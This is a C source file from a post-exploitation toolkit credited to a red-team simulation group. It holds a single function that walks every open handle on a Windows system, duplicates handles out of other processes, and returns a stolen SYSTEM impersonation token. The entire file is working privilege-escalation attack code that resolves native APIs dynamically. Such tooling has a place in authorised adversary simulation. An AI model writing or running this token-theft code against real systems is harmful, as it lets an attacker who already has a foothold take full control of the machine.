/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQuerySystemInformation );
	D_API( NtQueryInformationToken );
	D_API( RtlReAllocateHeap );
	D_API( NtDuplicateObject );
	D_API( RtlAllocateHeap );
	D_API( NtOpenProcess );
	D_API( RtlFreeHeap );
	D_API( NtClose );
} API ;

/*!
 *
 * Purpose:
 *
 * Locates an elevated token.
 *
!*/
HANDLE TokenFindSystemToken( VOID )
{
	API					Api;
	LUID					Uid;
	CLIENT_ID				Cid;
	TOKEN_STATISTICS			Tst;
	OBJECT_ATTRIBUTES			Att;
	OBJECT_TYPE_INFORMATION			Oti;

	UINT32					Len = 0;
	TOKEN_TYPE				Typ = 0;

	HANDLE					Sys = NULL;
	HANDLE					Ntl = NULL;
	HANDLE					Prc = NULL;
	HANDLE					Obj = NULL;
	PSYSTEM_HANDLE_INFORMATION		Shi = NULL;
	PSYSTEM_HANDLE_INFORMATION		Tmp = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uid, sizeof( Uid ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Tst, sizeof( Tst ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Oti, sizeof( Oti ) );

	/* Load NTDLL dependency */
	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {
		
		/* Locate function dependency */
		Api.NtQuerySystemInformation  = C_PTR( GetProcAddress( Ntl, "NtQuerySystemInformation" ) );
		Api.NtQueryInformationToken   = C_PTR( GetProcAddress( Ntl, "NtQueryInformationToken" ) );
		Api.RtlReAllocateHeap         = C_PTR( GetProcAddress( Ntl, "RtlReAllocateHeap" ) );
		Api.NtDuplicateObject         = C_PTR( GetProcAddress( Ntl, "NtDuplicateObject" ) );
		Api.RtlAllocateHeap           = C_PTR( GetProcAddress( Ntl, "RtlAllocateHeap" ) );
		Api.NtOpenProcess             = C_PTR( GetProcAddress( Ntl, "NtOpenProcess" ) );
		Api.RtlFreeHeap               = C_PTR( GetProcAddress( Ntl, "RtlFreeHeap" ) );
		Api.NtClose                   = C_PTR( GetProcAddress( Ntl, "NtClose" ) );

		/* Query the type information to get the index */
		if ( ( Shi = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( SYSTEM_HANDLE_INFORMATION ) ) ) != NULL ) {

			/* Current size! */
			Len = sizeof( SYSTEM_HANDLE_INFORMATION );

			/* Keep allocating till we have all the supported size */
			while ( ! NT_SUCCESS( Api.NtQuerySystemInformation( SystemHandleInformation, Shi, Len, NULL ) ) ) {

				/* Extend the size of the new buffer! */
				Len = Len + sizeof( SYSTEM_HANDLE_INFORMATION );
				Tmp = Api.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Shi, Len );

				/* Did we fail? */
				if ( C_PTR( Tmp ) == C_PTR( NULL ) ) {
					/* Abort */
					break;
				};
				/* Set next pointer */
				Shi = C_PTR( Tmp );
			};

			/* Enumerate the list of handles */
			for ( UINT32 Idx = 0 ; Idx < Shi->NumberOfHandles ; ++Idx ) {
				/* Open up the process so we can duplicate the object */
				Cid.UniqueThread  = C_PTR( NULL );
				Cid.UniqueProcess = C_PTR( Shi->Handles[ Idx ].UniqueProcessId );
				InitializeObjectAttributes( &Att, NULL, OBJ_CASE_INSENSITIVE, 0, 0 );

				if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_DUP_HANDLE, &Att, &Cid ) ) ) {

					/* Open up the target object into our process! */
					if ( NT_SUCCESS( Api.NtDuplicateObject( Prc, Shi->Handles[ Idx ].HandleValue, NtCurrentProcess(), &Obj, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {

						/* Query information about the 'Token' */
						if ( NT_SUCCESS( Api.NtQueryInformationToken( Obj, TokenStatistics, &Tst, sizeof( Tst ), &Len ) ) ) {
							/* Is this a system token thats 'valid' */
							Uid.LowPart  = 0x3E7;
							Uid.HighPart = 0;

							/* Compare the low and high parts of the token */
							if ( Tst.AuthenticationId.LowPart == Uid.LowPart && Tst.AuthenticationId.HighPart == Uid.HighPart ) {
								/* Has the needed privileges ? */
								if ( Tst.PrivilegeCount >= 22 ) {
									/* Query the token type whether its Impersonation or Primary */
									if ( NT_SUCCESS( Api.NtQueryInformationToken( Obj, TokenType, &Typ, sizeof( Typ ), &Len ) ) ) {
										/* Is a impersonation token? */
										if ( Typ != TokenPrimary ) {
											/* Duplicate the token to return */
											Api.NtDuplicateObject( Prc, Shi->Handles[ Idx ].HandleValue, NtCurrentProcess(), &Sys, 0, 0, DUPLICATE_SAME_ACCESS );
										};
									};
								};
							};
						};

						/* Close */
						Api.NtClose( Obj );
					};

					/* Close! */
					Api.NtClose( Prc );
				};
			};

			/* Free Memory */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Shi );
		};

		/* Dereference */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uid, sizeof( Uid ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Tst, sizeof( Tst ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Oti, sizeof( Oti ) );

	/* Return Token */
	return C_PTR( Sys );
};
